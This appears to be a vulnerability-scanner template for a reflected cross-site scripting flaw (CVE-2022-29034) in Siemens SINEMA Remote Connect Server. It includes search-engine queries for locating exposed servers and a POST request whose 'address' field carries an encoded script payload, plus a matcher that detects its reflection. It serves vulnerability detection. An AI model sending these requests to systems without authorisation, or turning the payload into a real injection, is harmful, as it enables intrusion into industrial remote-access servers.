id: CVE-2022-29034

info:
  name: Reflected Cross-Site Scripting in SINEMA Remote Connect Server
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    A vulnerability in SINEMA Remote Connect Server allows attackers to perform reflected XSS attacks via an error message pop-up window that does not properly sanitize user input.
  impact: |
    Allows attackers to execute malicious scripts in the context of the victim's browser.
  remediation: |
    Implement input validation and output encoding to prevent XSS attacks.
  reference:
    - https://cert-portal.siemens.com/productcert/html/ssa-484086.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-29034
    cwe-id: CWE-79
    epss-score: 0.0022
    epss-percentile: 0.60776
    cpe: cpe:2.3:a:siemens:sinema_remote_connect_server:*:*:*:*:*:*:*:*
  metadata:
    vendor: siemens
    product: sinema_remote_connect_server
    shodan-query: title:"Logon - SINEMA Remote Connect"
    fofa-query: title="logon - sinema remote connect"
    google-query: intitle:"logon - sinema remote connect"

http:
  - method: POST
    path:
      - "{{BaseURL}}/services/syslog_client_settings"

    headers:
      Content-Type: application/x-www-form-urlencoded
      X-Requested-With: XMLHttpRequest
      X-Csrftoken: "{{csrf_token}}"
      Referer: "{{BaseURL}}/services/syslog_client_settings"

    body: |
      address=127.0.0.1.<script>eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))</script>&port=1234&protocol=tcp&client_authentication=false&certificate=62&mode=
    matchers:
      - type: word
        words:
          - "<script>eval(atob(\"YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"))</script>"
        part: body
